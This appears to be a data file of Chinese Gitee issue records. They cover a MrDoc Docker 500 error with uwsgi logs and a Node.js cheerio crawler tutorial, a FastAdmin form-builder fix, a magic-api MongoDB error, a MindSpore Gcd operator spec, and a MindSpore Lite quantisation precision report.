Docker 项目 500 错误 ,"环境 变量 系统 Linux -Ubuntu 18.04 Docker Docker version 19.03.12, build 48a66213fe 容器 jonnyan404/mrdoc-nginx lastest 附上导致失败的markdown内容 爬虫实例 数据源 爬虫要想爬取数据首先提供爬取<em>数据的路径</em>，在这里我们爬取本课程的课程介绍页面。 url：http://www.hubwiz.com/course/562427361bc20c980538e26f 爬虫目标 课程介绍页面中最重要的信息就是每一章节的标题及其中小节的<em>标题名称</em>。我们的目标就是把它爬取出来，然后输出。 小爬虫 提供了爬取路径之后，我们首先利用 http 模块中<em>get 和 request</em> 爬取路径页面中的内容。 解析：示例中首先引用了 nodejs 的核心模块 http 和提供了爬取路径，然后通过 http 中的 get 接口给 url 发送 get 请求，最回调函数中对请求回来的数据进行处理。 对 html 进行解析，这个时候就用到了 cheerio 这个模块了。 使用方法：<em>var cheerio = require('cheerio');</em> 现在来看一下我们路径中的 html 目标代码： 分析：在上图中的两个红色圆圈中就是我们要爬取的目标，第一个是我们章的标题，第二个是小节的标题。那么我们应该怎样去获取这些标签中内容呢？ 获取章标题：<em>$('.panel').find('h4').text()</em>; 获取节标题：<em>$('.panel').find('li').text()</em>; 爬取数据 在前面的小节中我们把准备工作和 html 代码分析都完成了。现在开始<em>爬取数据</em>。 把对 html 解析的工作封成一个方法，如下： 解析：首先通过<em>cheerio</em>的 load 方法把html加载；然后对*.panel*通过 map 进行遍历。之后我们在 <em>map</em> 中 组装 要数据格式，如上述中 <em>chapterData</em>。再对 小节 li 进行遍历，把 section 通过 push 方法 添加到 chapterData.section 的数组中。再把组装好的数据 push 到 我们创建的空数组 data 中。最后通过console.log进行输出。 输出数据之后，我们看到数据中除了第一章中有section有值，其他的章没有值，不要担心，就是这样的。因为我们汇智网对其进行了限制，所以只能爬取到第一章中的小节标题。 处理数据 在大多数情况下我们爬取出来的数据，可能不是我们最终想要的东西比如说：数据中<em>空值或者空格</em>等等。 如果你细心的话，不难发现我们在上一个小节中在获取在通过 text 获取内容的后面跟随着一个 trim 的方法。这个方法的作用就是处理数据中空格和换行符。 如果你想验证一下效果你可以把右边练习环境中应用到 trim 方法的地方去掉trim方法。 空值的情况，在上一小节我们输出的数据中存在一个空的数组对象，那么我们通过什么方法去处理它呢？这时我们就用到了 <em>filter</em> 方法。 PS：filter方法我们在<em>cheerio API(二) 过滤DOM小节</em> 中已经讲解到了。 代码： 输出数据 现在把我们在 <em>crawlerChapter</em> 方法中得到的数据 data 组装，进行输出： 方法解析：在 printInfo 方法中的参数 data ，这个参数需要 crawlerChapter 方法 return 给printInfo。然后就是 data 参数调用 filter 方法把数据为空的去掉。最后就是把章节拼接字符串进行输出。   <code>: Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/qrcodejs/qrcode.min.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/qrcodejs/qrcode.min.js?version=0.6.6 (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16603/31885] 172.17.0.1 () {58 vars in 1945 bytes} [Fri May 14 21:36:42 2021] GET /static/qrcodejs/qrcode.min.js?version=0.6.6 =&gt; generated 0 bytes in 11 msecs via sendfile() (HTTP/1.0 200) 6 headers in 213 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/mrdoc/mrdoc-docs.js?version=0.6.6 HTTP/1.0"" 200 3883 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/mrdoc/mrdoc-docs.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/mrdoc/mrdoc-docs.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/mrdoc/mrdoc-docs.js?version=0.6.6 (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15283/31886] 172.17.0.1 () {58 vars in 1939 bytes} [Fri May 14 21:36:42 2021] GET /static/mrdoc/mrdoc-docs.js?version=0.6.6 =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 213 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/iconFont/iconfont.js?version=0.6.6 HTTP/1.0"" 200 3882 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/iconFont/iconfont.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/iconFont/iconfont.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/iconFont/iconfont.js?version=0.6.6 (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16604/31887] 172.17.0.1 () {58 vars in 1941 bytes} [Fri May 14 21:36:42 2021] GET /static/iconFont/iconfont.js?version=0.6.6 =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 214 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/editor.md/lib/marked.min.js?version=0.6.6 HTTP/1.0"" 200 3883 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/marked.min.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/marked.min.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/editor.md/lib/marked.min.js?version=0.6.6 (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15284/31888] 172.17.0.1 () {58 vars in 1955 bytes} [Fri May 14 21:36:42 2021] GET /static/editor.md/lib/marked.min.js?version=0.6.6 =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 213 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/editor.md/editormd.js?version=0.6.6 HTTP/1.0"" 200 3882 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/editormd.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/editormd.js?version=0.6.6 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/editor.md/editormd.js?version=0.6.6 (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16605/31889] 172.17.0.1 () {58 vars in 1943 bytes} [Fri May 14 21:36:42 2021] GET /static/editor.md/editormd.js?version=0.6.6 =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 214 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/dashang/dashang_wx.webp HTTP/1.0"" 200 3895 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_wx.webp (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_wx.webp (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/dashang/dashang_wx.webp (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15285/31890] 172.17.0.1 () {58 vars in 1969 bytes} [Fri May 14 21:36:42 2021] GET /static/dashang/dashang_wx.webp =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 201 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/dashang/dashang_alipay.webp HTTP/1.0"" 200 3895 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_alipay.webp (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_alipay.webp (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/dashang/dashang_alipay.webp (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16606/31891] 172.17.0.1 () {58 vars in 1977 bytes} [Fri May 14 21:36:42 2021] GET /static/dashang/dashang_alipay.webp =&gt; generated 0 bytes in 11 msecs via sendfile() (HTTP/1.0 200) 6 headers in 201 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/dashang/dashang_qq.webp HTTP/1.0"" 200 3895 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_qq.webp (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_qq.webp (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/dashang/dashang_qq.webp (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15286/31892] 172.17.0.1 () {58 vars in 1969 bytes} [Fri May 14 21:36:42 2021] GET /static/dashang/dashang_qq.webp =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 201 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/dashang/dashang_paypal.png HTTP/1.0"" 200 3897 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_paypal.png (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/dashang/dashang_paypal.png (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/dashang/dashang_paypal.png (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16607/31893] 172.17.0.1 () {58 vars in 1975 bytes} [Fri May 14 21:36:42 2021] GET /static/dashang/dashang_paypal.png =&gt; generated 0 bytes in 10 msecs via sendfile() (HTTP/1.0 200) 6 headers in 199 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/layui/font/iconfont.woff2?v=256 HTTP/1.0"" 200 3895 ""https://apisev.cn/static/layui/css/layui.css?version=0.6.6"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/layui/font/iconfont.woff2?v=256 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/layui/font/iconfont.woff2?v=256 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/layui/font/iconfont.woff2?v=256 (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15287/31894] 172.17.0.1 () {60 vars in 1991 bytes} [Fri May 14 21:36:42 2021] GET /static/layui/font/iconfont.woff2?v=256 =&gt; generated 0 bytes in 7 msecs via sendfile() (HTTP/1.0 200) 6 headers in 201 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/layui/css/modules/laydate/default/laydate.css?v=5.0.9 HTTP/1.0"" 200 3898 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/layui/css/modules/laydate/default/laydate.css?v=5.0.9 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/layui/css/modules/laydate/default/laydate.css?v=5.0.9 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/layui/css/modules/laydate/default/laydate.css?v=5.0.9 (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16608/31895] 172.17.0.1 () {58 vars in 1993 bytes} [Fri May 14 21:36:42 2021] GET /static/layui/css/modules/laydate/default/laydate.css?v=5.0.9 =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 198 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/layui/css/modules/layer/default/layer.css?v=3.1.1 HTTP/1.0"" 200 3897 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/layui/css/modules/layer/default/layer.css?v=3.1.1 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/layui/css/modules/layer/default/layer.css?v=3.1.1 (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/layui/css/modules/layer/default/layer.css?v=3.1.1 (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15288/31896] 172.17.0.1 () {58 vars in 1985 bytes} [Fri May 14 21:36:42 2021] GET /static/layui/css/modules/layer/default/layer.css?v=3.1.1 =&gt; generated 0 bytes in 13 msecs via sendfile() (HTTP/1.0 200) 6 headers in 199 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/layui/css/modules/code.css HTTP/1.0"" 200 1063 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" [pid: 20|app: 0|req: 16609/31897] 172.17.0.1 () {58 vars in 1940 bytes} [Fri May 14 21:36:42 2021] GET /static/layui/css/modules/code.css =&gt; generated 1063 bytes in 5 msecs via sendfile() (HTTP/1.0 200) 6 headers in 198 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""POST /get_pro_doc_tree/ HTTP/1.0"" 200 338 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" [pid: 19|app: 0|req: 15289/31898] 172.17.0.1 () {66 vars in 2106 bytes} [Fri May 14 21:36:42 2021] POST /get_pro_doc_tree/ =&gt; generated 338 bytes in 12 msecs (HTTP/1.0 200) 5 headers in 159 bytes (1 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/editor.md/lib/raphael.min.js HTTP/1.0"" 200 3883 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/raphael.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/raphael.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/editor.md/lib/raphael.min.js (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16610/31899] 172.17.0.1 () {58 vars in 1930 bytes} [Fri May 14 21:36:42 2021] GET /static/editor.md/lib/raphael.min.js =&gt; generated 0 bytes in 12 msecs via sendfile() (HTTP/1.0 200) 6 headers in 213 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/editor.md/lib/purify.min.js HTTP/1.0"" 200 3883 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/purify.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/purify.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/editor.md/lib/purify.min.js (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15290/31900] 172.17.0.1 () {58 vars in 1928 bytes} [Fri May 14 21:36:42 2021] GET /static/editor.md/lib/purify.min.js =&gt; generated 0 bytes in 9 msecs via sendfile() (HTTP/1.0 200) 6 headers in 213 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/layui/css/modules/layer/default/loading-1.gif HTTP/1.0"" 200 701 ""https://apisev.cn/static/layui/css/modules/layer/default/layer.css?v=3.1.1"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" [pid: 20|app: 0|req: 16611/31901] 172.17.0.1 () {58 vars in 2058 bytes} [Fri May 14 21:36:42 2021] GET /static/layui/css/modules/layer/default/loading-1.gif =&gt; generated 701 bytes in 5 msecs via sendfile() (HTTP/1.0 200) 6 headers in 198 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/editor.md/lib/underscore.min.js HTTP/1.0"" 200 3883 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/underscore.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/underscore.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/editor.md/lib/underscore.min.js (172.17.0.1) OSError: write error [pid: 19|app: 0|req: 15291/31902] 172.17.0.1 () {58 vars in 1936 bytes} [Fri May 14 21:36:42 2021] GET /static/editor.md/lib/underscore.min.js =&gt; generated 0 bytes in 6 msecs via sendfile() (HTTP/1.0 200) 6 headers in 213 bytes (0 switches on core 0) 172.17.0.1 - - [14/May/2021:21:36:42 +0800] ""GET /static/editor.md/lib/prettify.min.js HTTP/1.0"" 200 3883 ""https://apisev.cn/project-21/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56"" ""119.186.210.55"" Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/prettify.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /static/editor.md/lib/prettify.min.js (ip 172.17.0.1) !!! Fri May 14 21:36:42 2021 - uwsgi_response_sendfile_do(): Broken pipe [core/writer.c line 655] during GET /static/editor.md/lib/prettify.min.js (172.17.0.1) OSError: write error [pid: 20|app: 0|req: 16612/31903] 172.17.0.1 () {58 vars in 1932 bytes} [Fri May 14 21:36:42 2021] GET /static/editor.md/lib/prettify.min.js =&gt; generated 0 bytes in 7 msecs via sendfile() (HTTP/1.0 200) 6 headers in 213 bytes (0 switches on core 0) var http = require('http'); var url = 'http://www.hubwiz.com/course/5437538a032c781670afddbe/'; http.get(url, function(res){ var html = ''; res.on('data', function(data){ html += data; }) res.on('end',function(){ console.log(html); }) }).on('error', function(){ console.log('爬取页面错误'); }); function crawlerChapter(html) { var $ = cheerio.load(html); var chapters = $('.panel'); var data = []; chapters.map(function (node) { var chapters = $(this); var chapterTitle = chapters.find('h4').text().trim(); var sections = chapters.find('li'); var chapterData = { chapterTitle: chapterTitle, section: [] }; sections.map(function (node) { var section = $(this).text().trim(); chapterData.section.push(section); }); data.push(chapterData); }); console.log(data); }; data.filter(function(obj){ return obj.chapterTitle ? true : false; }); function printInfo(data) { data = data.filter(function filterByID(obj) { return obj.chapterTitle ? true : false; }); data.map(function (item) { var chapterTitle = item.chapterTitle; console.log('【' + chapterTitle + '】\n'); item.section.map(function (section) { console.log(' 【' + section + '】\n'); }); }) };"
FormBuilder表单生成器image和images里的一个bug,"https://gitee.com/karson/fastadmin/blob/master/extend/fast/Form.php#L926 https://gitee.com/karson/fastadmin/blob/master/extend/fast/Form.php#L948 应该修改为   <code>: $chooseAttr = is_array($chooseAttr) ? array_merge($default, $chooseAttr) : $chooseAttr; $chooseAttr = is_array($chooseAttr) ? array_merge($default, ['data-mimetype'=&gt;'image/*'], $chooseAttr) : $chooseAttr;"
mongodb更新操作报错,2021-07-23 14:10:26.855 [magic-script] INFO org.ssssssss.magicapi.controller.RequestHandler - Close Console Session : e3bf551822624311acbfde0ce430e03a   <code>: &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.2.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt;
【众智】【计算-AICPU开发】Gcd,Gcd AICPU算子适配 + functional接口 + CPU算子迁移 逐元素计算两个tensor的最大公约数。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py x1 x2 y 对应底层算子 对应底层AI CPU算子Gcd Classify Name Type TypeRange Required Doc AttrDefault INPUT x1 BasicType TRUE INPUT x2 BasicType TRUE OUTPUT y BasicType TRUE PyTorch1.8.1接口： torch.gcd https://pytorch.org/docs/1.8.1/generated/torch.gcd.html 3. 异常处理 4. 算子反向 无反向   <code>: def gcd(x1: tensor， x2: tensor) -&gt; tensor: return y class Gcd(Primitive):
[MS][LITE][master]CPU/GPU+WEIGHTQUANT+Q888_*recognition_self.onnx precision loss > 4%,": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: 测试版本：master，commi_id:7a537f4cfc35db8025358077cf8edfc2e5a9ec6e (2021-07-24-09-56-39) 测试用例：033_Q888CV_models/06_Face_clustering/Q888_CV_face_recognition_self.onnx , 将标杆数据以及ms模型推送到手机mate40，进行推理验证精度 测试结果：输入0-255，预期模型推理结果精度对比成功，实际推理结果为部分场景推理结果误差大于4% 测试结论： CPU_FP32/FP16+WEIGHTQUANT，GPU_FP32/FP16+WEIGHTQUANT 推理结果误差大于4% MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1643][DEBUG]Check eval result. [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][0] eval=-15.773438 ,benchmark=-14.904208 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][1] eval=-0.724609 ,benchmark=-0.760698 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][2] eval=-12.468750 ,benchmark=-12.418756 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][3] eval=-50.156250 ,benchmark=-52.858189 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][4] eval=-32.343750 ,benchmark=-33.571732 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][5] eval=-25.968750 ,benchmark=-26.937065 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][6] eval=36.312500 ,benchmark=36.741489 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][7] eval=31.328125 ,benchmark=32.592606 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][8] eval=15.242188 ,benchmark=15.566675 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][9] eval=-34.718750 ,benchmark=-35.007153 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][10] eval=58.750000 ,benchmark=60.602375 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][11] eval=1.666016 ,benchmark=1.979075 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][12] eval=-19.234375 ,benchmark=-18.510353 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][13] eval=18.875000 ,benchmark=19.685289 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][14] eval=13.671875 ,benchmark=13.592055 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][15] eval=-44.437500 ,benchmark=-46.490868 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][16] eval=10.406250 ,benchmark=10.470912 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][17] eval=22.781250 ,benchmark=24.159702 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][18] eval=40.593750 ,benchmark=42.237080 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343][Check][Reshape_output][19] eval=42.281250 ,benchmark=42.016460 [MS_LITE_TEST][16:51:28 2021/07/26][new_net_test_mslite.cpp:1343]..."
